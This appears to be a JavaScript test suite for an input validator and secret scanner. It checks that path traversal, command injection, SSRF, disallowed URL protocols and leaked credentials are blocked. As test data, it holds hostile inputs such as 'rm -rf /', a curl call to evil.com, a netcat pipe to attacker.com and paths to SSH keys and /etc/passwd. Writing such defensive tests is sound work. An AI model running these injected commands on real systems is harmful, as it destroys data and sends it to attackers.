const assert = require('assert');
const { NISTValidator, EntropyScanner } = require('../../core/pipeline/audit');

console.log('🧪 Testing NIST SI-10 Security Validation...\n');

// Test 1: Path traversal detection (../)
console.log('▶ Test 1: Path traversal attack detection (..)');
const traversalIntent1 = {
    type: 'filesystem',
    operation: 'read',
    params: { path: '../../../etc/passwd' },
    extensionId: 'attacker-ext'
};

const result1 = NISTValidator.validate(traversalIntent1);
assert.strictEqual(result1.valid, false, 'Path traversal should be blocked');
assert.ok(result1.violations.some(v => v.rule === 'SI-10-PATH-TRAVERSAL'), 
    'Should detect SI-10-PATH-TRAVERSAL violation');
assert.ok(result1.violations.some(v => v.message.includes('Path traversal')), 
    'Message should mention path traversal');
console.log('✅ Path traversal with .. detected\n');

// Test 2: More complex path traversal
console.log('▶ Test 2: Complex path traversal patterns');
const traversalPatterns = [
    '../config/secrets.txt',
    '../../.ssh/id_rsa',
    'docs/../../../etc/hosts',
    './test/../../sensitive.key'
];

for (const pattern of traversalPatterns) {
    const intent = {
        type: 'filesystem',
        operation: 'read',
        params: { path: pattern },
        extensionId: 'attacker-ext'
    };
    const result = NISTValidator.validate(intent);
    assert.strictEqual(result.valid, false, `Should block: ${pattern}`);
    assert.ok(result.violations.some(v => v.rule === 'SI-10-PATH-TRAVERSAL'), 
        `Should detect traversal in: ${pattern}`);
}
console.log('✅ All path traversal patterns blocked\n');

// Test 3: Command injection detection (shell operators)
console.log('▶ Test 3: Command injection detection');
const injectionCommands = [
    'ls && cat /etc/passwd',
    'git status || rm -rf /',
    'node app.js; curl http://evil.com',
    'npm install | nc attacker.com 4444'
];

for (const cmd of injectionCommands) {
    const intent = {
        type: 'process',
        operation: 'spawn',
        params: { command: cmd },
        extensionId: 'attacker-ext'
    };
    const result = NISTValidator.validate(intent);
    assert.strictEqual(result.valid, false, `Should block: ${cmd}`);
    assert.ok(result.violations.some(v => v.rule === 'SI-10-COMMAND-INJECTION'), 
        `Should detect injection in: ${cmd}`);
}
console.log('✅ All command injection attempts blocked\n');

// Test 4: SSRF (Server-Side Request Forgery) - localhost access
console.log('▶ Test 4: SSRF attempt detection (localhost)');
const ssrfIntent1 = {
    type: 'network',
    operation: 'https',
    params: { url: 'http://localhost:8080/admin' },
    extensionId: 'attacker-ext'
};

const ssrfResult1 = NISTValidator.validate(ssrfIntent1);
// Should have warning about localhost access
assert.ok(ssrfResult1.warnings.some(w => w.rule === 'SI-10-LOCALHOST-ACCESS'), 
    'Should warn about localhost access');
console.log('✅ Localhost access flagged as warning\n');

// Test 5: SSRF - 127.0.0.1 access
console.log('▶ Test 5: SSRF attempt with 127.0.0.1');
const ssrfIntent2 = {
    type: 'network',
    operation: 'https',
    params: { url: 'http://127.0.0.1:9000/internal' },
    extensionId: 'attacker-ext'
};

const ssrfResult2 = NISTValidator.validate(ssrfIntent2);
assert.ok(ssrfResult2.warnings.some(w => w.rule === 'SI-10-LOCALHOST-ACCESS'), 
    'Should warn about 127.0.0.1 access');
console.log('✅ 127.0.0.1 access flagged\n');

// Test 6: Invalid protocol blocking
console.log('▶ Test 6: Invalid protocol blocking');
const invalidProtocols = [
    'file:///etc/passwd',
    'ftp://internal.server/data',
    'gopher://legacy.system'
];

for (const url of invalidProtocols) {
    const intent = {
        type: 'network',
        operation: 'http',
        params: { url },
        extensionId: 'attacker-ext'
    };
    const result = NISTValidator.validate(intent);
    assert.strictEqual(result.valid, false, `Should block protocol: ${url}`);
    assert.ok(result.violations.some(v => v.rule === 'SI-10-PROTOCOL-ALLOWLIST'), 
        `Should detect invalid protocol in: ${url}`);
}
console.log('✅ Invalid protocols blocked\n');

// Test 7: Secret detection in parameters
console.log('▶ Test 7: AWS key detection in parameters');
const awsKeyIntent = {
    type: 'network',
    operation: 'https',
    params: { 
        url: 'https://api.example.com',
        headers: { 'Authorization': 'AWS AKIAIOSFODNN7EXAMPLE' }
    },
    extensionId: 'leaky-ext'
};

const awsKeyResult = NISTValidator.validate(awsKeyIntent);
assert.strictEqual(awsKeyResult.valid, false, 'Should block AWS key in params');
assert.ok(awsKeyResult.violations.some(v => v.rule === 'SI-10-SECRET-DETECTION'), 
    'Should detect secret');
console.log('✅ AWS key detected in parameters\n');

// Test 8: Private key detection in file write
console.log('▶ Test 8: Private key detection in write content');
const privateKeyIntent = {
    type: 'filesystem',
    operation: 'write',
    params: { 
        path: 'deploy.key',
        content: '-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQ...'
    },
    extensionId: 'leaky-ext'
};

const privateKeyResult = NISTValidator.validate(privateKeyIntent);
assert.strictEqual(privateKeyResult.valid, false, 'Should block private key in content');
assert.ok(privateKeyResult.violations.some(v => v.rule === 'SI-10-CONTENT-SECRETS'), 
    'Should detect private key in content');
console.log('✅ Private key detected in write content\n');

// Test 9: Entropy scanner for high-entropy secrets
console.log('▶ Test 9: Entropy scanner for high-entropy data');
const highEntropyStrings = [
    'sk_test_FAKEKEYFORTESTING000000000000000',
    'ghp_1234567890abcdefghijklmnopqrstuvwxyz',
    'xoxb-000000000000-000000000000-XXXXXXXXXXXXXXXXXXXXXXXX'
];

for (const secret of highEntropyStrings) {
    const scan = EntropyScanner.scanForSecrets(secret);
    assert.strictEqual(scan.hasSecrets, true, `Should detect high entropy in: ${secret}`);
    assert.ok(scan.findings.length > 0, 'Should have findings');
}
console.log('✅ High-entropy secrets detected\n');

// Test 10: Entropy calculation validation
console.log('▶ Test 10: Shannon entropy calculation');
const lowEntropyString = 'aaaaaaaaaa';
const highEntropyString = 'aB3$xZ9#pQ';

const lowEntropy = EntropyScanner.calculateEntropy(lowEntropyString);
const highEntropy = EntropyScanner.calculateEntropy(highEntropyString);

assert.ok(lowEntropy < 2, `Low entropy should be < 2, got ${lowEntropy}`);
assert.ok(highEntropy > 3, `High entropy should be > 3, got ${highEntropy}`);
console.log(`✅ Entropy calculation correct (low: ${lowEntropy.toFixed(2)}, high: ${highEntropy.toFixed(2)})\n`);

// Test 11: Valid filesystem operations should pass
console.log('▶ Test 11: Valid filesystem operations pass validation');
const validFsIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: 'src/app.js' },
    extensionId: 'safe-ext'
};

const validFsResult = NISTValidator.validate(validFsIntent);
assert.strictEqual(validFsResult.valid, true, 'Valid filesystem operation should pass');
assert.strictEqual(validFsResult.violations.length, 0, 'Should have no violations');
console.log('✅ Valid filesystem operation passed\n');

// Test 12: Valid network request should pass
console.log('▶ Test 12: Valid network request passes validation');
const validNetIntent = {
    type: 'network',
    operation: 'https',
    params: { 
        url: 'https://api.github.com/repos',
        method: 'GET'
    },
    extensionId: 'safe-ext'
};

const validNetResult = NISTValidator.validate(validNetIntent);
assert.strictEqual(validNetResult.valid, true, 'Valid network request should pass');
assert.strictEqual(validNetResult.violations.length, 0, 'Should have no violations');
console.log('✅ Valid network request passed\n');

// Test 13: Valid process command should pass
console.log('▶ Test 13: Valid process command passes validation');
const validProcessIntent = {
    type: 'process',
    operation: 'spawn',
    params: { command: 'git status' },
    extensionId: 'safe-ext'
};

const validProcessResult = NISTValidator.validate(validProcessIntent);
assert.strictEqual(validProcessResult.valid, true, 'Valid process command should pass');
assert.strictEqual(validProcessResult.violations.length, 0, 'Should have no violations');
console.log('✅ Valid process command passed\n');

// Test 14: Secret sanitization
console.log('▶ Test 14: Secret sanitization');
const sensitiveData = 'API_KEY=AKIAIOSFODNN7EXAMPLE and TOKEN=xoxb-1234567890123';
const sanitized = EntropyScanner.sanitize(sensitiveData);
assert.ok(sanitized.includes('[REDACTED]'), 'Should redact secrets');
assert.ok(!sanitized.includes('AKIAIOSFODNN7EXAMPLE'), 'Should not contain full AWS key');
console.log('✅ Secret sanitization works\n');

// Test 15: Multiple violations in single intent
console.log('▶ Test 15: Multiple violations detection');
const multiViolationIntent = {
    type: 'process',
    operation: 'spawn',
    params: { 
        command: 'git clone && cat secrets.txt',
        token: 'AKIAIOSFODNN7EXAMPLE'
    },
    extensionId: 'bad-ext'
};

const multiViolationResult = NISTValidator.validate(multiViolationIntent);
assert.strictEqual(multiViolationResult.valid, false, 'Should fail validation');
assert.ok(multiViolationResult.violations.length >= 2, 'Should detect multiple violations');
assert.ok(multiViolationResult.violations.some(v => v.rule === 'SI-10-COMMAND-INJECTION'), 
    'Should detect command injection');
assert.ok(multiViolationResult.violations.some(v => v.rule === 'SI-10-SECRET-DETECTION'), 
    'Should detect secret');
console.log('✅ Multiple violations detected\n');

// Test 16: Edge cases - empty and null inputs
console.log('▶ Test 16: Edge cases (empty/null inputs)');
const emptyPathIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: '' },
    extensionId: 'test-ext'
};
const emptyResult = NISTValidator.validate(emptyPathIntent);
assert.strictEqual(emptyResult.valid, false, 'Empty path should fail');

const nullPathIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: null },
    extensionId: 'test-ext'
};
const nullResult = NISTValidator.validate(nullPathIntent);
assert.strictEqual(nullResult.valid, false, 'Null path should fail');
console.log('✅ Edge cases handled\n');

// Test 17: Allowlist validation
console.log('▶ Test 17: File extension and path allowlist warnings');
const suspiciousFileIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: '/tmp/suspicious.exe' },
    extensionId: 'test-ext'
};

const suspiciousResult = NISTValidator.validate(suspiciousFileIntent);
// Should pass but with warnings about non-standard extension
assert.ok(suspiciousResult.warnings.some(w => w.rule === 'SI-10-PATH-ALLOWLIST'), 
    'Should warn about non-standard file extension');
console.log('✅ Allowlist warnings working\n');

// Test 18: Git operations validation
console.log('▶ Test 18: Git operations (no injection)');
const validGitIntent = {
    type: 'git',
    operation: 'status',
    params: { args: ['--short'] },
    extensionId: 'git-ext'
};

const validGitResult = NISTValidator.validate(validGitIntent);
assert.strictEqual(validGitResult.valid, true, 'Valid git operation should pass');
console.log('✅ Valid git operation passed\n');

// Test 19: URL validation
console.log('▶ Test 19: Invalid URL detection');
const invalidUrlIntent = {
    type: 'network',
    operation: 'https',
    params: { url: 'not-a-valid-url' },
    extensionId: 'test-ext'
};

const invalidUrlResult = NISTValidator.validate(invalidUrlIntent);
assert.strictEqual(invalidUrlResult.valid, false, 'Invalid URL should fail');
assert.ok(invalidUrlResult.violations.some(v => v.rule === 'SI-10-URL-VALIDATION'), 
    'Should detect invalid URL');
console.log('✅ Invalid URL detected\n');

// Test 20: Command allowlist warnings
console.log('▶ Test 20: Non-standard command warnings');
const nonStandardCmd = {
    type: 'process',
    operation: 'spawn',
    params: { command: 'ruby script.rb' },
    extensionId: 'test-ext'
};

const nonStandardResult = NISTValidator.validate(nonStandardCmd);
// Should pass but warn about non-standard command
assert.ok(nonStandardResult.warnings.some(w => w.rule === 'SI-10-COMMAND-ALLOWLIST'), 
    'Should warn about non-standard command');
console.log('✅ Non-standard command warning issued\n');

console.log('🎉 All NIST SI-10 security validation tests passed!');
